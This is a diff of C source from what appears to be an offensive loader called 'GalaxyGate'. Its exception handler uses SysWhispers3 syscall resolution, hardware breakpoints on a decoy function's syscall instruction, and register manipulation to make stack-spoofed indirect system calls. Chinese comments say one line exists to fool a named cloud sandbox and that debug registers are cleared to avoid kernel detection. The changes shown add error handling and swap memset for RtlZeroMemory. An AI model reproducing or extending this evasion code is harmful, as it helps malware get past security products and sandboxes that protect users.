@@ -6,6 +6,8 @@
 #include <wctype.h>
 #include "VEHinj.h"
 
+#undef RtlZeroMemory
+
 // SysWhisper3 SSN-Resolve
 PVOID SW3_GetSyscallAddress(DWORD FunctionHash);
 DWORD SW3_GetSyscallNumber(DWORD FunctionHash);
@@ -19,6 +21,8 @@ typedef struct _SFParams {
 
 DWORD* NullPointer = NULL;
 SFParams Params = { 0 }; // 用于向VEH传递真实的函数调用参数
+void PrintDbgW(wchar_t* message);
+void ErrExit();
 
 /*========================================
   GalaxyGate 自研栈欺骗间接系统调用方案 :3
@@ -34,6 +38,10 @@ SFParams Params = { 0 }; // 用于向VEH传递真实的函数调用参数
 
 LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptInfo) {
 	if (pExceptInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
+		if (pExceptInfo->ExceptionRecord->ExceptionInformation[0] != 1) {
+			PrintDbgW(L"[-] 未知错误引发了非可写访问冲突 | An unknown error occured and invoked an access violation.");
+			ErrExit();
+		}
 		pExceptInfo->ContextRecord->Dr0 = (DWORD_PTR)SW3_GetSyscallAddress(Params.DummyHash); // 在傀儡函数的syscall指令处设置硬件断点
 		pExceptInfo->ContextRecord->Dr7 = 0x00000303; // 启用Dr0断点
 		pExceptInfo->ContextRecord->Rip = pExceptInfo->ContextRecord->Rip + 6; // 跳过引发异常用的*NullPointer = 1指令
@@ -58,7 +66,7 @@ LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptInfo) {
 		// 上一行是为了对抗天穹云沙箱 删除该行会被判断为直接系统调用
 		pExceptInfo->ContextRecord->Dr0 = 0;
 		pExceptInfo->ContextRecord->Dr7 = 0; // 清除调试寄存器 防止内核态对硬件断点的检测
-		memset(&Params, 0, sizeof(Params));
+		RtlZeroMemory(&Params, sizeof(Params));
 		return EXCEPTION_CONTINUE_EXECUTION;
 	}
 	return EXCEPTION_CONTINUE_SEARCH;
